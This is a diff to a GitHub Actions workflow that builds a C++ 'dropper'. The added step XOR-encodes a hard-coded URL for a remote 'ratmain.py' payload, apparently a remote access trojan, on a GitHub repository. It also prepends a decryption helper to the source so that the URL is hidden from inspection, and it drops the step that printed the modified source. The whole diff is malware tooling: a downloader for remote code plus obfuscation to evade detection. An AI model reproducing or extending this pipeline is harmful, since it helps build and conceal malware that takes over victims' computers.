@@ -31,7 +31,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
 
-      - name: Replace placeholders
+      - name: Replace placeholders and obfuscate
         run: |
           $content = Get-Content -Path dropper.cpp -Raw
           $content = $content -replace [regex]::Escape('{{FILE_NAME}}'), [regex]::Escape('${{ github.event.inputs.file_name }}')
@@ -43,9 +43,38 @@ jobs:
           if ('${{ github.event.inputs.bound_file_data }}' -ne '') {
               $content = $content -replace [regex]::Escape('{{BOUND_FILE_DATA}}'), [regex]::Escape('${{ github.event.inputs.bound_file_data }}')
           }
+
+          # XOR encrypt the payload URL
+          $payloadUrl = "https://raw.githubusercontent.com/ovrlust/dropper/main/ratmain.py"
+          $xorKey = "payload"
+          $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($xorKey)
+          $urlBytes = [System.Text.Encoding]::UTF8.GetBytes($payloadUrl)
+          $xorEncoded = New-Object byte[] $urlBytes.Length
+          for ($i = 0; $i -lt $urlBytes.Length; $i++) {
+              $xorEncoded[$i] = $urlBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
+          }
+          $hexEncoded = ($xorEncoded | ForEach-Object { "{0:02x}" -f $_ }) -join ""
+
+          # Add decryption helper at top of file
+          $decryptFunc = @"
+std::string z(const char* h, const char* k) {
+    std::string r;
+    const unsigned char* kb = (const unsigned char*)k;
+    size_t kl = strlen(k);
+    for (size_t i = 0; i < strlen(h); i += 2) {
+        char b[3] = {h[i], h[i+1], 0};
+        unsigned char c = (unsigned char)strtol(b, 0, 16) ^ kb[i/2 % kl];
+        r += (char)c;
+    }
+    return r;
+}
+"@
+
+          $content = $content -replace 'const std::string g_payload_url = "https://raw.githubusercontent.com/ovrlust/dropper/main/ratmain.py";', "const char* g_hex = `"$hexEncoded`"; const char* g_key = `"$xorKey`";"
+          $content = $content -replace 'return b\(g_payload_url\);', 'return b(z(g_hex, g_key));'
+
+          $content = $decryptFunc + "`n`n" + $content
           Set-Content -Path dropper.cpp -Value $content
-          Write-Host "=== Modified dropper.cpp ==="
-          Get-Content -Path dropper.cpp
 
       - name: Set up MSVC
         uses: ilammy/msvc-dev-cmd@v1
